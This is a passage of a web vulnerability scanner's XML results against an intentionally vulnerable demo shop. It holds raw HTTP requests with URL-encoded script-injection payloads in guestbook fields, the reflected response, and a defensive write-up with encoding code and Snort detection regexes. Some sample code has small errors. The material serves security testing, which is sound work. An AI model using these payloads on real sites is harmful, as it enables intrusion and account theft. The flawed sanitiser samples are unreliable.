</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/guestbook.php</Value></Header><Header><Name>Content-Type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>140</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="385A3137611FC63127563A086B8D2D6E";PSID="9E6C877AA131AD437C7CCB4E24D75A01";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="name";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="anonymous%2520user%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2531%2537%2533%2531%2538%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="41";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="31";smi="0";sc="1";ID="6d065dfc";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="6e4804f2";sc="1";tid="41";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>guestbook</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<div class="story">
	<table width="100%" cellpadding="4" cellspacing="1"><tr><td colspan="2"><h2>Our guestbook</h2></td></tr><tr><td align="left" valign="middle" style="background-color:#F5F5F5"><strong>anonymous user<sCrIpT>alert(17318)</sCrIpT></strong></td><td align="right" style="background-color:#F5F5F5">12.11.2020, 9:50 pm</td></tr><tr><td colspan="2"><img src="/images/remark.gif">&nbsp;&nbsp;12345</td></tr></table>	 </div>
	  <div class="story">
	  	<form action="" method="post" name="faddentry">
			<input type="hidden" name="name" value="anonymous user">
			<textarea name="text" rows="5" wrap="VIRTUAL" style="width:500px;"></textarea>
			<br>
			<input type="submit" name="submit" value="add message">
		</form>
	  </div>
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:50:00 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>5438</Value></Header></Headers><SetCookies /><Forms><Form><Action /><Method>post</Method><Name>faddentry</Name><OnSubmit /><InputFields><InputField><Name>name</Name><Value>anonymous user</Value><Size /><MaxLength>0</MaxLength><sType>hidden</sType><Class /></InputField><InputField><Name>submit</Name><Value>add message</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas><TextArea><Name>text</Name><Value /><MaxLength>0</MaxLength><Class /></TextArea></TextAreas><SelectFields /></Form><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="4B1ECB95A3E1896DD96F219B6EC4BCC5"><URL>http://php.vulnweb.com:80/guestbook.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor>text</AttackParamDescriptor><Issues><Issue id="fd0ae64c-e784-4c46-b99a-313ea6876b80"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5105</EngineType><AttackHTTPRequest><![CDATA[POST /guestbook.php HTTP/1.1
Referer: http://php.vulnweb.com/guestbook.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 140
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="4B1ECB95A3E1896DD96F219B6EC4BCC5";PSID="9E6C877AA131AD437C7CCB4E24D75A01";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="text";AttackParamIndex="1";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="12345%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2537%2538%2532%2535%2534%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="47";tt="40";
X-RequestManager-Memo: sid="43";smi="0";sc="1";ID="a49d8938";
X-Request-Memo: ID="da0ead33";sc="1";tid="47";
Cookie: CustomCookie=WebInspect0

name=anonymous%20user&text=12345%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%37%38%32%35%34%29%3c%2f%73%43%72%49%70%54%3e&submit=add%20message]]></AttackHTTPRequest><VulnerabilityID>5649</VulnerabilityID><Severity>4</Severity><Name>Cross-Site Scripting</Name><Classifications><Classification kind="CWE" identifier="CWE-80" href="http://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="Cross-Site Scripting: Reflected" href="https://vulncat.fortify.com/">Cross-Site Scripting: Reflected</Classification></Classifications><DetectionSelection><Location offset="2647" length="29" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<drc_fortify /><hp-img src="xss.rgc" /><br /><drc_xssrf />A Cross-Site Scripting (XSS) vulnerability was detected in the web application. Cross-Site Scripting occurs when dynamically generated web pages display user input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. In this instance, the web application was vulnerable to an automatic payload, meaning the user simply has to visit a page to make the malicious scripts execute. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on end user systems. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
Cross-Site Scripting(XSS) happens when user input from a web client is immediately included via server-side scripts in a dynamically generated web page. Reflected XSS is specifically considered critical when malicious payload can be embedded in a URL (e.g. in query strings of GET requests). An attacker can trick a victim, via phishing attack, to click on a link with vulnerable input which has been altered to include attack code and then sent to the legitimate server. The injected code is then reflected back to the user's browser which executes it. <br /><br />

The implications of successful Cross-Site Scripting attacks are:

<ul><li>Account hijacking -  An attacker can hijack the user's session before the session cookie expires and take actions with the privileges of the user who accessed the URL, such as issuing database queries and viewing the results. </li><li>Malicious script execution - Users can unknowingly execute JavaScript, VBScript, ActiveX, HTML, or even Flash content that has been inserted into a dynamically generated page by an attacker. 

</li><li>Worm propagation - With Ajax applications, XSS can propagate somewhat like a virus. The XSS payload can autonomously inject itself into pages, and easily re-inject the same host with more XSS, all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user.
</li><li>Information theft - Via redirection and fake sites, attackers can connect users to a malicious server of the attacker's choice and capture any information entered by the user.</li><li>	Denial of Service - Often by utilizing malformed display requests on sites that contain a Cross-Site Scripting vulnerability, attackers can cause a denial of service condition to occur by causing the host site to query itself repeatedly . </li><li>Browser Redirection - On certain types of sites that use frames, a user can be made to think that he is in fact on the original site when he has been redirected to a malicious one, since the URL in the browser's address bar will remains the same. This is because the entire page isn't being redirected, just the frame in which the JavaScript is being executed is redirected. </li><li>	Manipulation of user settings - Attackers can change user settings for nefarious purposes. </li><li>Bypass Content-Security-Policy protection  -  Attackers can inject a malformed tag formation, known as dangling tag injection, which in some cases allows injected script to reuse valid nonce on the page and bypass script source restriction. Additionally dangling tag injection can be used to steal sensitive information embedded in HTML response if browser is able to make a request to the injected link. </li><li>Base tag injection: Attacker can cause relative links on a page to load from a different domain by modifying the base URL for the page via base tag injection.</li><li>Link prefetch injection: While unable to execute script, attackers can use link tag with rel=prefetch that will make browsers pre-fetch the specified link even though it is never rendered and rejected subsequently due to web application enforced cross-site policy (e.g. CSP protections).</li><li>Edge side includes (ESI) Injection - ESI  is a markup language used in various HTTP devices, such as reverse proxies and load balancers, that are positioned between client and server.  An attacker can inject ESI markup to perform critical attacks such as cross-site scripting and HTTPOnly cookie protection bypass. </li></ul>]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />

View the attack string included with the request to check what to search for in the response. For instance, if "(javascript:alert('XSS')"  is submitted as an attack (or another scripting language), it will also appear as part of the response.  This indicates that the web application is taking values from the HTTP request parameters and using them in the HTTP response without first removing potentially malicious data.


The response can be viewed in “Web Browser” view in the Vulnerability pane to see the injected popup events in action. Events requiring user interaction (e.g. onmouseover or onclick events) can be triggered by performing the corresponding action (e.g. clicking the injected link). 



Injection with numeric string in src, or href, attributes indicates that the site is vulnerable to script include or content exfiltration. These can be verified by repeating the request in a browser and intercepting originating network traffic in a web proxy.]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br /><br />
Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. When validating user input, 

verify that it matches the strictest definition of valid input possible. For example, if a certain parameter is supposed to be a number, attempt 

to convert it to a numeric data type in your programming language. <br /><br /><b>PHP:</b> intval("0".$_GET['q']);   <br /><br /><b>ASP.NET:</b> 

int.TryParse(Request.QueryString["q"], out val); <br /><br />

The same applies to date and time values, or anything that can be converted to a stricter type before being used. When accepting other types of 

text input, make sure the value matches either a list of acceptable values (white-listing), or a strict regular expression. If at any point the 

value appears invalid, do not accept it. Also, do not attempt to return the value to the user in an error message. <br /><br />

Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. 

These should be used to sanitize all input before it is displayed to the client. <br /><br /><b>PHP:</b>  string htmlspecialchars (string string 

[, int quote_style])<br /><br /><b>ASP.NET:</b> Server.HTMLEncode (strHTML String)



<br /><br />

When reflecting values into JavaScript or another format, make sure to use a type of encoding that is appropriate. Encoding data for HTML is not 

sufficient when it is reflected inside of a script or style sheet. For example, when reflecting data in a JavaScript string, make sure to encode 

all non-alphanumeric characters using hex (\xHH) encoding.<br /><br />

If you have JavaScript on your page that accesses unsafe information (like location.href) and writes it to the page (either with document.write, 

or by modifying a DOM element), make sure you encode data for HTML before writing it to the page. JavaScript does not have a built-in function to 

do this, but many frameworks do. If you are lacking an available function, something like the following will handle most cases:<br /><br />

s = s.replace(/&amp;/g,'&amp;amp;').replace(/"/i,'&amp;quot;').replace(/&lt;/i,'&amp;lt;').replace(/&gt;/i,'&amp;gt;').replace(/'/i,'&amp;apos;')


<br /><br />

Ensure that you are always using the right approach at the right time. Validating user input should be done as soon as it is received. Encoding 

data for display should be done immediately before displaying it.

<b><br /><br />


For Security Operations:</b><br /><br />

Server-side encoding, where all dynamic content is first sent through an encoding function where Scripting tags will be replaced with codes in the 

selected character set, can help to prevent Cross-Site Scripting attacks. <br /><br />

Many web application platforms and frameworks have some built-in support for preventing Cross-Site Scripting. Make sure that any built-in 

protection is enabled for your platform. In some cases, a misconfiguration could allow Cross-Site Scripting. In ASP.NET, if a page's 

EnableViewStateMac property is set to False, the ASP.NET view state can be used as a vector for Cross-Site Scripting. <br /><br />

An IDS or IPS can also be used to detect or filter out XSS attacks. Below are a few regular expressions that will help detect Cross-Site 

Scripting. <br /><br /><b>Regex for a simple XSS attack:</b><br />
/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/ix <br /><br />

The above regular expression would be added into a new Snort rule as follows: <br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"NII Cross-Site Scripting attempt"; flow:to_server,established; 

pcre:"/((\%3C)|&lt;)((\%2F)|\/)*[a-z0-9\%]+((\%3E)|&gt;)/i"; classtype:Web-application-attack; sid:9000; rev:5;) <br /><br /><b>Paranoid regex for 

XSS attacks:</b><br />
/((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/I <br /><br />

This signature simply looks for the opening HTML tag, and its hex equivalent, followed by one or more characters other than the new line, and then 

followed by the closing tag or its hex equivalent. This may end up giving a few false positives depending upon how your web application and web 

server are structured, but it is guaranteed to catch anything that even remotely resembles a Cross-Site Scripting attack.

<br /><br /><b>For QA:</b><br /><br />


Fixes for Cross-Site Scripting defects will ultimately require code based fixes. Read the the following links for more information 

about manually testing your application for Cross-Site Scripting.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><br /><b>OWASP Cross-Site Scripting Information</b><br /><a href="https://www.owasp.org/index.php/XSS">https://www.owasp.org/index.php/XSS</a><br /><br /><b>CERT</b><br /><a href="http://www.cert.org/advisories/CA-2000-02.html">http://www.cert.org/advisories/CA-2000-02.html</a><br /><br /><b>Apache</b><br /><a href="http://httpd.apache.org/info/css-security/apache_specific.html">http://httpd.apache.org/info/css-security/apache_specific.html</a><br /><br /><b>SecurityFocus.com</b><br /><a href="http://www.securityfocus.com/infocus/1768 ">http://www.securityfocus.com/infocus/1768 </a>]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Cross-Site Scripting occurs when dynamically generated web pages display input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, utilizing client-side validation of user supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[When successfully exploited, Cross-Site Scripting gives an attacker a method of taking control of the interaction between a user and a web site. On a simple site composed of static content, this might only lead to changing how pages display to a specific user. When the site is capable of accepting user input, such as login information, or allows users to make choices with real world implications such as transferring funds or accessing private data, Cross-Site Scripting presents its most serious threat. The most significant danger from a successful Cross-Site Scripting attack is that an attacker will be able to emulate the credentials of an actual user by gaining access to a user’s session cookie, thereby hijacking the user session and taking over the account. The FDIC has recently indicated that unauthorized access to checking accounts is the fastest growing form of identity theft. More often than not, these instances of account hijacking are due to the presence of Cross-site scripting vulnerabilities. When an attacker gains control on the user’s end, it then often becomes unnecessary to break into the server. By that point, he already has the means to acquire the information he needs.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[To carry out a Cross-Site Scripting attack, an attacker will create a URL that takes advantage of a Cross-Site Scripting flaw. The attacker must then find some way of getting a victim to visit this URL. This can be done in many ways, ranging from getting it listed in a search engine to exploiting weaknesses in mail clients that allow scripted content to be executed. Once the victim has used the Cross-Site Scripting URL, the attacker's malicious code will be executed on his or her system.  In other words, there is a lot of effort required up-front for these attacks to be successful.  However, the potential payoff makes that effort worthwhile more often than not.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed quickly, especially if the application is already in production.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. Validation can be done using standard ASP.NET Validation controls, or directly in your code. Do not attempt to sanitize input by removing script strings or characters, simply reject it. Always use as strict a pattern as you can possibly allow.<br /><br />
Encoding of output insures that any scriptable content is properly encoded for HTML before being sent to the client. This is done with the function HttpUtility.HtmlEncode, as shown in the following Label control sample:<br /><br />
	Label2.Text = HttpUtility.HtmlEncode(input)
<br /><br />Be sure to consider all paths that user input takes through your application. For instance, if data is entered by the user, stored in a database, and then redisplayed later, you must make sure it is properly encoded each time it is retrieved.If you must allow free-format text input, such as in a message board, and you wish to allow some HTML formatting to be used, you can handle this safely by explicitly allowing only a small list of safe tags. Here is an example of how to do this safely:<br /><br />
C# Example:<br /><br />
            StringBuilder sb = new StringBuilder(<br />
                HttpUtility.HtmlEncode(input)); <br />
            sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;"); <br />
            sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;"); <br />
            Response.Write(sb.ToString());<br /><br />

VB.NET Example: <br /><br />
        Dim sb As StringBuilder = New StringBuilder( _ <br />
                HttpUtility.HtmlEncode(input)) <br />
        sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;") <br />
        sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;") <br />
        Response.Write(sb.ToString())<br /><br />

The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure what is being returned is what is expected, and is valid. </li><li>Use client-side validation when adding extra functionality to user input checking in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered " &lt;script&gt;alertdocumentcookie( 'aaa') &lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response, so that they cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms as opposed to single-factor authentication. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the web, or given to you by an acquaintance) for use in your own code. </li></ul>
Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. These should be used to sanitize all input before displayed to the client. 
<br /><br />
ASP / ASP.NET: Server.HTMLEncode (strHTML String)<br /><br />]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the Web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure the data being returned is what is expected, and is valid. </li><li>When adding extra functionality to user-input checking, use client-side validation in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user-supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered "&lt;script&gt;alertdocumentcookie('aaa')&lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response. Encoding ensures that the characters cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms, such as requiring a token and password, as opposed to single-factor authentication, such as requiring only a password. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the Web or given to you by an acquaintance) for use in your own code. </li></ul>
The Java language does not have a built-in method to convert the value of the input variable into correct, non-interpretable HTML. The following code samples show two different ways of writing a utility method to sanitize all user input before displaying it back to the client. <br /><br /><br />
public static String HTMLEncode(String aTagFragment){ <br /><br />
  //make sure you replace &amp; first<br />
  aTagFragment = aTagFragment.replaceAll("&amp;", "&amp;amp;"); <br />
  aTagFragment = aTagFragment.replaceAll("&lt;", "&amp;lt;"); <br />
  aTagFragment = aTagFragment.replaceAll("&gt;", "&amp;gt;"); <br />
  aTagFragment = aTagFragment.replaceAll("\"", "&amp;quot;"); <br />
  aTagFragment = aTagFragment.replaceAll("'", "&amp;#39;"); <br />
  //replace backslash ‘\’ character<br />
  aTagFragment = aTagFragment.replaceAll("\\\\", "&amp;#92;"); <br /><br />
  return aTagFragment; <br />
}<br /><br />
public static String HTMLEncode(String aTagFragment){ <br />
  final StringBuffer result = new StringBuffer();<br />
  final StringCharacterIterator iterator = new StringCharacterIterator(aTagFragment); <br />
  char character = iterator.current();<br />
  while (character != StringCharacterIterator.DONE ){ <br />
   		if (character == '&lt;') { <br />
   			result.append("&amp;lt;"); <br />
   		} <br />
   		else if (character == '&gt;') { <br />
   			result.append("&amp;gt;"); <br />
   		} <br />
   		else if (character == '\"') { <br />
   			result.append("&amp;quot;"); <br />
   		} <br />
   		else if (character == '\'") { <br />
   			result.append("&amp;#39;"); <br />
   		} <br />
   		else if (character == '\\') { <br />
   			result.append("&amp;#92;"); <br />
   		} <br />
   		else if (character == '&amp;') { <br />
   			result.append("&amp;amp;"); <br />
   		} <br />
   		else { <br />
   			//the char is not a special one <br />
   			//add it to the result as is <br />
   			result.append(character); <br />
   		} <br />
   		character = iterator.next();<br />
   	} <br />
   	return result.toString();<br />
}]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="4B1ECB95A3E1896DD96F219B6EC4BCC5"><![CDATA[POST /guestbook.php HTTP/1.1
Referer: http://php.vulnweb.com/guestbook.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 140
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="4B1ECB95A3E1896DD96F219B6EC4BCC5";PSID="9E6C877AA131AD437C7CCB4E24D75A01";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="text";AttackParamIndex="1";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="12345%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2537%2538%2532%2535%2534%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="47";tt="40";
X-RequestManager-Memo: sid="43";smi="0";sc="1";ID="a49d8938";
X-Request-Memo: ID="da0ead33";sc="1";tid="47";
Cookie: CustomCookie=WebInspect0

name=anonymous%20user&text=12345%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%37%38%32%35%34%29%3c%2f%73%43%72%49%70%54%3e&submit=add%20message]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:50:01 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 5438

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>guestbook</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
